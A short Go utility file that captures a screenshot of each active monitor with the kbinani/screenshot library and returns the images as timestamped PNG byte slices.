package utils

import (
	"bytes"
	"image/png"
	"time"

	"github.com/kbinani/screenshot"
)

type Shots struct {
	ShotTime time.Time
	Data     []byte
}

//GetClientScreenshots return desktop screenshots, 1 for monitor
func GetClientScreenshots() []Shots {
	n := screenshot.NumActiveDisplays()

	var shots []Shots

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}

		buf := new(bytes.Buffer)
		err1 := png.Encode(buf, img)
		if err1 != nil {
			continue
		}
		sends3 := buf.Bytes()

		shots = append(shots, Shots{ShotTime: time.Now(), Data: sends3})

	}

	return shots
}
